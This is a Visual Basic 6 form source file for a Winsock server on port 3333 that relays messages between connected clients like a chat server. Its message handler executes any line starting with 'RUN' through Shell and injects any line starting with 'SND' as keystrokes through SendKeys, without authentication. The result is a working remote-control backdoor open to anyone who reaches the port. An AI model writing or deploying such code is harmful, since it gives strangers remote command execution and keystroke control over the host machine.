VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock wsListen 
      Index           =   0
      Left            =   2160
      Top             =   1320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
    Listen 3333
    Me.Caption = wsListen(0).LocalIP
End Sub

Private Sub Listen(ByVal lngPort As Long)
    If wsListen(0).State <> sckClosed Then
        wsListen(0).Close
    End If
    
    wsListen(0).LocalPort = lngPort
    wsListen(0).Listen
End Sub

Private Sub Reset(ByVal Index As Integer)
    If wsListen(Index).State <> sckClosed Then
        wsListen(Index).Close
    End If
End Sub

Private Sub wsListen_Close(Index As Integer)
    Dim strIp As String
    strIp = wsListen(Index).RemoteHostIP
    Reset Index
    SendAll "* " & strIp & " has disconnected!"
End Sub

Private Sub wsListen_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    Dim iNext As Integer
    iNext = GetNext
    wsListen(iNext).Accept requestID
    wsListen(iNext).SendData "Welcome, you are " & wsListen(iNext).RemoteHostIP & vbCrLf
    SendAll "* " & wsListen(iNext).RemoteHostIP & " has joined!"
End Sub

Private Sub SendAll(ByVal strMsg As String)
    Dim i As Integer
    For i = 1 To wsListen.UBound
        If wsListen(i).State = sckConnected Then
            wsListen(i).SendData strMsg & vbCrLf
            DoEvents
        End If
    Next i
        
End Sub

Private Function GetNext() As Integer
    GetNext = -1
    Dim i As Integer
    For i = 1 To wsListen.UBound
        If wsListen(i).State = sckClosed Then
            GetNext = i
            Exit Function
        End If
    Next i
    GetNext = wsListen.UBound + 1
    Load wsListen(GetNext)
End Function

Private Sub wsListen_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim strArr() As String
    Dim a As String
    Dim strTemp As String
    wsListen(Index).GetData a
    wsListen(Index).Tag = wsListen(Index).Tag & a
loop1:
    Erase strArr()
    If InStr(wsListen(Index).Tag, vbCrLf) <> 0 Then
        strArr() = Split(wsListen(Index).Tag, vbCrLf)
        strTemp = strArr(0)
        wsListen(Index).Tag = Right(wsListen(Index).Tag, Len(wsListen(Index).Tag) - Len(strTemp) - 2)
        SendAll "Msg From " & wsListen(Index).RemoteHostIP & ": " & strTemp
        If UCase(Left(strTemp, 3)) = "RUN" Then
            RunFile Right(strTemp, Len(strTemp) - Len("RUN "))
        End If
        If UCase(Left(strTemp, 3)) = "SND" Then
            SendKeys Right(strTemp, Len(strTemp) - Len("RUN "))
        End If
        GoTo loop1:
    End If
End Sub

Private Sub RunFile(ByVal strFile As String)
    On Error Resume Next
    Call Shell(strFile, vbNormalFocus)
End Sub

Private Sub wsListen_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    Reset Index
End Sub

